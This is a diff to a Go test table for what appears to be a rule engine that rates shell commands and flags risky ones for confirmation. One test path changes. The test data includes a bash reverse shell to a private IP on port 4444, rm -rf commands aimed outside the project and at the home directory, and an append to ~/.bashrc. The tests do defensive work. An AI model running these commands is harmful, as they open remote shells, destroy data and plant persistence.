@@ -76,7 +76,7 @@ func TestRules(t *testing.T) {
 		{"persist clean session", "echo x >> ~/.bashrc", sess(false, false), None, ""},
 		// rule 5: reverse shell and risky destroy
 		{"reverse shell clean session", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", sess(false, false), Ask, "remote_shell"},
-		{"rm -rf outside project", "rm -rf /tmp/cache", sess(false, false), Ask, "destroy"},
+		{"rm -rf outside project", "rm -rf /var/lib/app-cache", sess(false, false), Ask, "destroy"},
 		{"rm -rf home", "rm -rf ~/projects", sess(false, false), Ask, "destroy"},
 		{"rm -rf parent", "rm -rf ../other", sess(false, false), Ask, "destroy"},
 		{"rm -rf inside project", "rm -rf build dist", sess(false, false), None, ""},
